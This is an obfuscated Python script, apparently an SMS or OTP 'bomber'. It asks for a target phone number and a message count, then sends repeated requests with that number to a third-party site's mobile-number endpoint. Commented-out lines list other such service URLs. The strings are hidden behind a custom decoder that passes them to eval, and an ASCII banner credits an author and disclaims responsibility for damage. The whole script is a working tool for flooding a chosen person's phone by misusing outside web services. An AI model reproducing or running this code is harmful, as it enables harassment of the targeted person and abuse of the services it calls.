# coding: UTF-8
import sys
l11111ll_opy_ = sys.version_info [0] == 2
l1l1ll1l_opy_ = 2048
l111lll1_opy_ = 7
def l11ll_opy_ (l11111_opy_):
    global l1ll1111_opy_
    l1l111ll_opy_ = ord (l11111_opy_ [-1])
    l1111l1l_opy_ = l11111_opy_ [:-1]
    l1lllll1_opy_ = l1l111ll_opy_ % len (l1111l1l_opy_)
    l1lll11_opy_ = l1111l1l_opy_ [:l1lllll1_opy_] + l1111l1l_opy_ [l1lllll1_opy_:]
    if l11111ll_opy_:
        l1ll11_opy_ = unicode () .join ([unichr (ord (char) - l1l1ll1l_opy_ - (l1l11_opy_ + l1l111ll_opy_) % l111lll1_opy_) for l1l11_opy_, char in enumerate (l1lll11_opy_)])
    else:
        l1ll11_opy_ = str () .join ([chr (ord (char) - l1l1ll1l_opy_ - (l1l11_opy_ + l1l111ll_opy_) % l111lll1_opy_) for l1l11_opy_, char in enumerate (l1lll11_opy_)])
    return eval (l1ll11_opy_)
from urllib.request import Request,urlopen
from urllib.parse import urlencode
import platform
import os
import time
def l1l1lll1l_opy_():
    if platform.system().lower()==l11ll_opy_ (u"ࠨࡷࡪࡰࡧࡳࡼࡹࠢࡲ"):
        os.system(l11ll_opy_ (u"ࠢࡤ࡮ࡶࠦࡳ"))
    else:
        os.system(l11ll_opy_ (u"ࠣࡥ࡯ࡩࡦࡸࠢࡴ"))
    print(l11ll_opy_ (u"ࠤࠥࠦࠒࠐࠍࠋࠢࠣ࠳ࠩࠪࠤࠥࠦࠧࠤࠥ࠵ࠤࠥࠢࠣࠤࠥࠦࠠ࠰ࠦࠧࠤࠥ࠵ࠤࠥࠦࠧࠨࠩࠦࠠࠡࠢࠣࠤࠥࠦ࠯ࠥࠦࠧࠨࠩࠪࠤࠡࠢࠣ࠳ࠩࠪࠤࠥࠦࠧࠤࠥ࠵ࠤࠥࠢࠣࠤࠥࠦࠠ࠰ࠦࠧࠤ࠴ࠪࠤࠥࠦࠧࠨࠩࠦࠠ࠰ࠦࠧࠨࠩࠪࠤࠥࠦࠣ࠳ࠩࠪࠤࠥࠦࠧࠨࠥࠓࠊࠡ࠱ࠧࠨࡤࡥࠠࠡࠦࠧࢀࠥࠪࠤࠥࠢࠣࠤࠥ࠵ࠤࠥࠦࠣ࠳ࠩࠪ࡟ࡠࠢࠣࠨࠩࠦࠠࠡࠢࠣࠤࢁࠦࠤࠥࡡࡢࠤࠥࠪࠤࠡ࠱ࠧࠨࡤࡥࠠࠡࠦࠧࢀࠥࠪࠤࠥࠢࠣࠤࠥ࠵ࠤࠥࠦࡿࠤࠩࠪ࡟ࡠࠢࠣࠨࠩࢂࠠࠥࠦࡢࡣࡤࡥ࡟࠰ࡾࠣࠨࠩࡥ࡟ࠡࠢࠧࠨࠒࠐࡼࠡࠦࠧࠤࠥࡢ࡟ࡠ࠱ࡿࠤࠩࠪࠤࠥࠢࠣ࠳ࠩࠪࠤࠥࡾࠣࠨࠩࠦࠠ࡝ࡡࡢ࠳ࠥࠦࠠࠡࠢࠣࢀࠥࠪࠤࠡࠢ࡟ࠤࠩࠪࡼࠡࠦࠧࠤࠥࡢࠠࠥࠦࡿࠤࠩࠪࠤࠥࠢࠣ࠳ࠩࠪࠤࠥࡾࠣࠨࠩࠦࠠ࡝ࠢࠧࠨࢁࠦࠤࠥࠢࠣࠤࠥࠦࠠࡽࠢࠧࠨࠥࠦ࡜ࠡࠦࠧࠑࠏࢂࠠࠡࠦࠧࠨࠩࠪࠤࠡࡾࠣࠨࠩࠦࠤࠥ࠱ࠧࠨࠥࠪࠤࡽࠢࠣࠨࠩࠪࠤࠥࠦࠣࠤࠥࠦࠠࠡࠢࡿࠤࠩࠪࠤࠥࠦࠧࠨࠥࢂࠠࠥࠦࠣࠤࢁࠦࠤࠥࡾࠣࠨࠩࠦࠤࠥ࠱ࠧࠨࠥࠪࠤࡽࠢࠧࠨࠩࠪࠤࠥࠦࠣࢀࠥࠪࠤࠥࠦࠧࠤࠥࠦࡼࠡࠦࠧࠨࠩࠪࠤࠥ࠱ࠐࠎࠥࡢ࡟ࡠࡡࡢࠤࠥࠪࠤࡽࠢࠧࠨࠥࠦࠤࠥࠦࡿࠤࠩࠪࠠ࡝ࡡࡢࡣࡤࠦࠠࠥࠦࠣࠤࠥࠦࠠࠡࡾࠣࠨࠩࡥ࡟ࠡࠢࠧࠨࢁࠦࠤࠥࠢࠣࢀࠥࠪࠤࡽࠢࠧࠨࠥࠦࠤࠥࠦࡿࠤࠩࠪࡼࠡࠦࠧࡣࡤࠦࠠࠥࠦࡿࠤࠩࠪ࡟ࡠ࠱ࠣࠤࠥࢂࠠࠥࠦࡢࡣࠥࠦࠤࠥࠏࠍࠤ࠴ࠪࠤࠡࠢ࡟ࠤࠩࠪࡼࠡࠦࠧࡠࠥࠦࠤࠡࡾࠣࠨࠩࠦ࠯ࠥࠦࠣࠤࡡࠦࠤࠥࠢࠣࠤࠥࠦࠠࡽࠢࠧࠨࠥࠦ࡜ࠡࠦࠧࢀࠥࠪࠤࠡࠢࡿࠤࠩࠪࡼࠡࠦࠧࡠࠥࠦࠤࠡࡾࠣࠨࠩࢂࠠࠥࠦࠣࠤࡡࠦࠤࠥࡾࠣࠨࠩࠦࠠࠡࠢࠣࠤࢁࠦࠤࠥࠢࠣࡠࠥࠪࠤࠎࠌࡿࠤࠥࠪࠤࠥࠦࠧࠨ࠴ࢂࠠࠥࠦࠣࡠ࠴ࠦࠠࡽࠢࠧࠨࢁࠦࠠࠥࠦࠧࠨࠩࠪ࠯ࠡࠢࠣࠤࠥࠦࡼࠡࠦࠧࠨࠩࠪࠤࠥ࠱ࡿࠤࠥࠪࠤࠥࠦࠧࠨ࠴ࢂࠠࠥࠦࠣࡠ࠴ࠦࠠࡽࠢࠧࠨࢁࠦࠤࠥࠦࠧࠨࠩࠪ࠯ࡽࠢࠧࠨࠩࠪࠤࠥࠦࠧࢀࠥࠪࠤࠡࠢࡿࠤࠩࠪࠍࠋࠢ࡟ࡣࡤࡥ࡟ࡠࡡ࠲ࠤࢁࡥ࡟࠰ࠢࠣࠤࠥࠦࡼࡠࡡ࠲ࠤࡡࡥ࡟ࡠࡡࡢࡣ࠴ࠦࠠࠡࠢࠣࠤࠥࢂ࡟ࡠࡡࡢࡣࡤࡥ࠯ࠡࠢ࡟ࡣࡤࡥ࡟ࡠࡡ࠲ࠤࢁࡥ࡟࠰ࠢࠣࠤࠥࠦࡼࡠࡡ࠲ࢀࡤࡥ࡟ࡠࡡࡢࡣ࠴ࠦࡼࡠࡡࡢࡣࡤࡥ࡟ࡠ࠱ࡿࡣࡤ࠵ࠠࠡࡾࡢࡣ࠴ࠓࠊࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠎࠌࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࡅࡽࠥࡀࠠࡔࡲࡨࡩࡩ࡞ࠠࠡࠏࠍࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࡘ࡫ࡷ࡬ࠥࡂ࠳ࠡࡈࡵࡳࡲࠦࡓࡱࡧࡨࡨ࡝ࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣࠤࠥࠦࠠࠎࠌࠣࠤࠥࠦࡎࡰࡶࡨࠤ࠿ࠦࡉࠡࡹࡲࡲࠬࡺࠠࡣࡧࠣࡶࡪࡹࡰࡰࡰࡶ࡭ࡧࡲࡥࠡࡨࡲࡶࠥࡧ࡮ࡺࠢࡧࡥࡲࡧࡧࡦࠢࡦࡥࡺࡹࡥࡥࠢࡥࡽࠥࡺࡨࡪࡵࠣࡷࡨࡸࡩࡱࡶ࠯ࠤ࡚ࡹࡥࠡࡣࡷࠤࡾࡵࡵࡳࠢࡲࡻࡳࠦࡲࡪࡵ࡮ࠑࠏࠨࠢࠣࡵ"))
#l1ll11l11_opy_://m.l1ll11l1l_opy_.l1l1l1l1l_opy_/l1l1l1ll1_opy_/l1ll11111_opy_/l1ll111l1_opy_/l1ll111l1_opy_.l1ll11111_opy_?l1ll11ll1_opy_=l1l1ll111_opy_&l1l1ll11l_opy_=
#l1ll1l111_opy_://l1l1ll1ll_opy_.l1ll11lll_opy_.l1l1l1l1l_opy_/l1ll1ll1l_opy_/platform/register?l1l1lll11_opy_=
#l1ll11l11_opy_://t.l1lll111l_opy_.l1l1l1l1l_opy_/l1ll1ll1l_opy_/l1l1ll1l1_opy_/10aug2016/l1ll1ll11_opy_.l1l1llll1_opy_?l1l1ll11l_opy_=
#l1ll11l11_opy_://l1lll1111_opy_.l1l1lllll_opy_.l1l1l1l1l_opy_/l1ll1l11l_opy_?l1ll1lll1_opy_=1&for=l1ll111ll_opy_&user=
#l1ll1l111_opy_://l1l1ll1ll_opy_.l1ll11lll_opy_.l1l1l1l1l_opy_/l1ll1ll1l_opy_/platform/register?l1l1lll11_opy_=
def send(num, l1l1l1lll_opy_, l1ll1l1ll_opy_):
    #url = [l11ll_opy_ (u"ࠥ࡬ࡹࡺࡰࡴ࠼࠲࠳ࡸ࡫ࡣࡶࡴࡨࡨࡦࡶࡩ࠯ࡥࡲࡲ࡫࡯ࡲ࡮ࡶ࡮ࡸ࠳ࡩ࡯࡮࠱ࡤࡴ࡮࠵ࡰ࡭ࡣࡷࡪࡴࡸ࡭࠰ࡴࡨ࡫࡮ࡹࡴࡦࡴࡂࡱࡴࡨࡩ࡭ࡧࡑࡹࡲࡨࡥࡳ࠿ࠥࡶ"),l11ll_opy_ (u"ࠦ࡭ࡺࡴࡱࡵ࠽࠳࠴ࡳ࠮࡯ࡣࡤࡴࡹࡵ࡬࠯ࡥࡲࡱ࠴࡬ࡡࡤࡧࡶ࠳࡯ࡹࡰ࠰ࡣ࡭ࡥࡽ࠵ࡡ࡫ࡣࡻ࠲࡯ࡹࡰࡀࡣࡦࡸ࡮ࡵ࡮࡯ࡣࡰࡩࡂࡩࡨࡦࡥ࡮ࡑࡴࡨࡩ࡭ࡧࡘࡷࡪࡸࡅࡹ࡫ࡶࡸࡸࠬ࡭ࡰࡤ࡬ࡰࡪࡃࠢࡷ"),l11ll_opy_ (u"ࠧ࡮ࡴࡵࡲࡶ࠾࠴࠵ࡴ࠯࡬ࡸࡷࡹࡪࡩࡢ࡮࠱ࡧࡴࡳ࠯ࡢࡲ࡬࠳࡮ࡴࡤࡪࡣࡢࡥࡵ࡯࡟ࡸࡴ࡬ࡸࡪ࠵࠱࠱ࡣࡸ࡫࠷࠶࠱࠷࠱ࡶࡩࡳࡪࡶࡤࡱࡧࡩ࠳ࡶࡨࡱࡁࡰࡳࡧ࡯࡬ࡦ࠿ࠥࡸ")]
    url=l11ll_opy_ (u"ࠨࡨࡵࡶࡳࡷ࠿࠵࠯࡮࠰ࡱࡥࡦࡶࡴࡰ࡮࠱ࡧࡴࡳ࠯ࡧࡣࡦࡩࡸ࠵ࡪࡴࡲ࠲ࡥ࡯ࡧࡸ࠰ࡣ࡭ࡥࡽ࠴ࡪࡴࡲࡂࡥࡨࡺࡩࡰࡰࡱࡥࡲ࡫࠽ࡤࡪࡨࡧࡰࡓ࡯ࡣ࡫࡯ࡩ࡚ࡹࡥࡳࡇࡻ࡭ࡸࡺࡳࠧ࡯ࡲࡦ࡮ࡲࡥ࠾ࠤࡹ")
    data={l11ll_opy_ (u"ࠢࡱࡪࡲࡲࡪࠨࡺ"):num}
    for x in range(l1l1l1lll_opy_):
        l1l1lll1l_opy_()
        print(l11ll_opy_ (u"ࠣࡖࡤࡶ࡬࡫ࡴࠡࡐࡸࡱࡧ࡫ࡲࠡࠢࠣࠤࠥࠦࠠࠡࠢࠣ࠾ࠥࠨࡻ"), num)
        print(l11ll_opy_ (u"ࠤࡑࡹࡲࡨࡥࡳࠢࡲࡪࠥࡓࡥࡴࡵࡤ࡫ࡪࠦࡓࡦࡰࡷࠤ࠿ࠦࠢࡼ"), x+1)
        l1ll1111l_opy_=url+num
        l1ll1l1l1_opy_=Request(l1ll1111l_opy_)
        urlopen(l1ll1l1l1_opy_)
        time.sleep(l1ll1l1ll_opy_)
try:
    l1l1lll1l_opy_()
    send(input(l11ll_opy_ (u"ࠥࡉࡳࡺࡥࡳࠢࡗࡥࡷ࡭ࡥࡵࠢࡑࡹࡲࡨࡥࡳࠢ࠽ࠤࠧࡽ")), int(input(l11ll_opy_ (u"ࠦࡊࡴࡴࡦࡴࠣࡒࡺࡳࡢࡦࡴࠣࡳ࡫ࠦࡍࡦࡵࡶࡥ࡬࡫ࡳࠡ࠼ࠣࠦࡾ"))), 1)
except Exception as e:
    print(l11ll_opy_ (u"࡙ࠧ࡯࡮ࡧࡷ࡬࡮ࡴࡧࠡ࡫ࡶࠤࡼࡸ࡯࡯ࡩࠣࡴࡱ࡫ࡡࡴࡧࠣࡖࡪ࠳ࡲࡶࡰࠣࡸ࡭࡯ࡳࠡࡵࡦࡶ࡮ࡶࡴ࠯ࠤࡿ"))